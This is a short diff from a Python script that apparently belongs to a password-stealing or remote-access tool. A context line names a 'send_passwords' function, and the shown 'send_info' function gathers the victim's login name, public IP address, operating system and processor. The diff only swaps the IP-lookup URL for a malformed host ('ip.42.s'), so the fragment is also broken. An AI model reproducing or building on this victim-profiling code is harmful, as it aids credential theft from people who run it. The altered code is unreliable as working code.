@@ -192,7 +192,7 @@ def send_passwords(message) :
 def send_info(command) :
     username = os.getlogin()
     
-    r = requests.get('http://ip.42.pl/raw')
+    r = requests.get('http://ip.42.s/raw')
     IP = r.text
     windows = platform.platform()
     processor = platform.processor()
